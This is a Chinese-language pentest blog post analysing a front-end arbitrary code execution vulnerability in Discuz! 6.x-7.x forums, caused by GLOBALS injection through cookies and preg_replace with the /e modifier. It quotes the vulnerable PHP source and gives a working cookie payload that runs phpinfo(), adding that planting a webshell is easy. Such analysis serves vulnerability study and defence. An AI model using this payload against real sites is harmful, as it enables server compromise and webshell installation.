<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>
    
      Discuz! 6.x-7.x 版本 前台任意代码执行漏洞
    
  </title>

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="learn code hack" />
<meta property="og:description" content="learn code hack" />
<link rel="canonical" href="https://blog.securitainment.io/pentest/discuz/2016/05/14/discuz-6.x-7.x-REC.html" />
<meta property="og:url" content="https://blog.securitainment.io/pentest/discuz/2016/05/14/discuz-6.x-7.x-REC.html" />
<meta property="og:site_name" content="Securitainment.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2016-05-14T08:54:00+08:00" />
<script type="application/ld+json">
{"url":"https://blog.securitainment.io/pentest/discuz/2016/05/14/discuz-6.x-7.x-REC.html","dateModified":"2016-05-14T08:54:00+08:00","datePublished":"2016-05-14T08:54:00+08:00","headline":"Discuz! 6.x-7.x 版本 前台任意代码执行漏洞","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.securitainment.io/pentest/discuz/2016/05/14/discuz-6.x-7.x-REC.html"},"description":"learn code hack","@type":"BlogPosting","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  <link type="application/atom+xml" rel="alternate" href="https://blog.securitainment.io/feed.xml" title="Securitainment.io" />

  <link rel="shortcut icon" type="image/x-icon" href="/" />
  <link rel="stylesheet" href="https://blog.securitainment.io/assets/css/main.css" />
</head>
<body>
    <main class="page-content" aria-label="Content">
        <div class="wrapper">
            <a href="https://blog.securitainment.io"></a>
<h1>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h1>
<!--more-->

<h2 id="discuz-6x-7x-版本-前台任意代码执行漏洞">Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2>

<h2 id="漏洞原理">漏洞原理</h2>

<p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>

<p>include/global.func.php代码里：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;code id="code0"&gt;function daddslashes($string, $force = 0) {
        !defined('MAGIC_QUOTES_GPC') &amp;&amp; define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
        if(!MAGIC_QUOTES_GPC || $force) {
                if(is_array($string)) {
                        foreach($string as $key =&gt; $val) {
                                $string[$key] = daddslashes($val, $force);
                        }
                } else {
                        $string = addslashes($string);
                }
        }
        return $string;
}&lt;/code&gt;
</code></pre></div></div>

<p>include/common.inc.php里：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
        foreach($$_request as $_key =&gt; $_value) {
                $_key{0} != '_' &amp;&amp; $$_key = daddslashes($_value);//变量引入000111222
        }
}
</code></pre></div></div>

<p>模拟register_globals功能的代码,在GPC为off时会调用addslashes()函数处理变量值,但是如果直接使用$_GET/$_POST/$_COOKIE这样的变量,这个就不起作用了,然而dz的源码里直接使用$_GET/$_POST/$_COOKIE的地方很少,存在漏洞的地方更加少:(</p>

<p>不过还有其他的绕过方法,在register_globals=on下通过提交GLOBALS变量就可以绕过上面的代码了.为了防止这种情况,dz中有如下代码:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
        exit('Request tainting attempted.');
}
</code></pre></div></div>

<p>这样就没法提交GLOBALS变量了么？</p>

<p>$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我们就可以通过COOKIE来提交GLOBALS变量了:)</p>

<h2 id="漏洞位置">漏洞位置</h2>

<p>include/discuzcode.func.php</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) {
        global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
        if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, '[ /code]') || strpos($message, '[ /CODE]')) !== FALSE) {
                $message = preg_replace("/\s?\[code\](.+?)\[\/code\]\s?/ies", "codedisp('\\1')", $message);
        }
        $msglower = strtolower($message);
        //$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
        if(!$htmlon) {
                $message = $jammer ? preg_replace("/\r\n|\n|\r/e", "jammer()", dhtmlspecialchars($message)) : dhtmlspecialchars($message);
        }
        if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS['_DCACHE']['smilies']) &amp;&amp; is_array($GLOBALS['_DCACHE']['smilies'])) {
                if(!$discuzcodes['smiliesreplaced']) {
                        foreach($GLOBALS['_DCACHE']['smilies']['replacearray'] AS $key =&gt; $smiley) {
                                $GLOBALS['_DCACHE']['smilies']['replacearray'][$key] = '&lt;img src="images/smilies/'.$GLOBALS['_DCACHE']['smileytypes'][$GLOBALS['_DCACHE']['smilies']['typearray'][$key]]['directory'].'/'.$smiley.'" smilieid="'.$key.'" border="0" alt="" /&gt;';
                        }
                        $discuzcodes['smiliesreplaced'] = 1;
                }
        $message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
        }
        ......
</code></pre></div></div>

<p>119行 ：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行
</code></pre></div></div>

<h2 id="poc">POC</h2>

<p>访问一个存在的帖子，需要访问的页面有表情。
例如：http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1
然后刷新帖子，拦截数据包，cookie中添加</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
</code></pre></div></div>

<p>如有漏洞，即可看到效果.
写个shell 自然也不是问题了~</p>

<h2 id="参考">参考</h2>

<p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt="" /></p>
<br/><p>Comments:</p>

<script src="https://utteranc.es/client.js"
        repo="5cr1pt/commnets.blog.securitainment.io"
        issue-term="url"
        theme="preferred-color-scheme"
        crossorigin="anonymous"
        async>
</script>
<div style="text-align: center;"><a href='https://blog.securitainment.io'>> HOME <</a>
</div>
<div style="display:none">
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-137221448-1', 'auto');
    ga('send', 'pageview');

  </script>
</div>

        </div>
    </main>

    
    </body>
</html>
